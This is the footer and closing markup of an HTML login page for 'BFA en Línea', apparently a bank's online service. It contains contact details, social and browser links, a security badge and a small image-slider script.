      <div class="help" style="text-align:center;margin-top:26px;font-size:14px">
        <div style="font-weight:700;color:#022a4f;margin-bottom:4px">Para asistencia</div>
        <a href="mailto:info.bfaonline@bfa.gob.sv" style="font-weight:700;text-decoration:underline;color:#022a4f">info.bfaonline@bfa.gob.sv</a>
      </div>
<br class="m-only">

      <div class="recover" style="text-align:center;margin-top:22px;font-size:14px;font-weight:700">
        <a href="#" style="text-decoration:underline">¿No puedes iniciar sesión?</a>
      </div>
<br class="m-only">
<br class="m-only"><br class="m-only"><br class="m-only">

      <div class="contact" style="margin-top:30px;display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap">
        <div class="socials" style="display:flex;flex-direction:column;align-items:center;gap:6px">
          <div class="icons" style="display:flex;gap:10px;align-items:center">
            <a href="#"><img src="img/fb-logo.png" alt="Facebook" style="width:18px;height:18px;object-fit:contain"></a>
            <a href="#"><img src="img/instagram-logo.png" alt="Instagram" style="width:18px;height:18px;object-fit:contain"></a>
            <a href="#"><img src="img/x-logo.png" alt="X" style="width:18px;height:18px;object-fit:contain"></a>
            <a href="#"><img src="img/youtube-logo.png" alt="YouTube" style="width:18px;height:18px;object-fit:contain"></a>
          </div>
          <div class="web" style="font-size:13px;font-weight:700;color:#022a4f">www.bfa.gob.sv</div>
        </div>
        <div class="divider" style="width:1px;height:48px;background:#022a4f;opacity:.3"></div>
        <div class="phone" style="display:flex;align-items:center;gap:10px">
          <img src="img/telefono-icon.png" alt="Teléfono" style="width:28px;height:28px">
          <div>
            <div class="num" style="font-size:22px;font-weight:700;color:#022a4f;line-height:1">2241-7400</div>
            <div class="telebfa" style="font-size:12px;font-weight:700;color:#022a4f;margin-top:2px">TELEBFA</div>
          </div>
        </div>
      </div>

      <div class="form-footer" style="width:100%;margin-top:30px;padding-top:18px;display:grid;grid-template-columns:auto 1fr;gap:14px;align-items:center">
        <div class="norton">
          <img src="img/nortonsecured-logo.png" alt="Norton Secured" style="height:50px">
        </div>
        <div class="right-col" style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;font-size:12px;color:#022a4f;text-align:right">
          <div class="copy" style="font-weight:600;line-height:1.3">© 2026 - BFA en Línea. Todos los derechos reservados.</div>
          <div class="opt" style="font-weight:600">Optimizado para navegadores. V1.8.11</div>
          <div class="browsers" style="display:flex;align-items:center;gap:10px;margin-top:4px">
            <a class="b" href="#" title="Microsoft Edge" style="display:flex;align-items:center;gap:4px;font-size:11px;color:#022a4f">
              <img src="img/edge-logo.svg" alt="Edge" style="width:22px;height:22px"><span>Microsoft Edge</span>
            </a>
            <a class="b" href="#" title="Google Chrome" style="display:flex;align-items:center;gap:4px;font-size:11px;color:#022a4f">
              <img src="img/chrome-logo.svg" alt="Chrome" style="width:22px;height:22px"><span>Google Chrome</span>
            </a>
          </div>
        </div>
      </div>

    </div>
  </div>

</div>

<script>
  // Auto-slider del panel izquierdo
  (function(){
    var slides = document.querySelectorAll('.photo .slide');
    if(!slides.length) return;
    var i = 0;
    setInterval(function(){
      slides[i].style.transform = 'translateX(-100%)';
      var next = (i + 1) % slides.length;
      slides[next].style.transition = 'none';
      slides[next].style.transform = 'translateX(100%)';
      void slides[next].offsetWidth;
      slides[next].style.transition = 'transform 1s ease-in-out';
      slides[next].style.transform = 'translateX(0)';
      i = next;
    }, 5000);
  })();
</script>
</body>
</html>
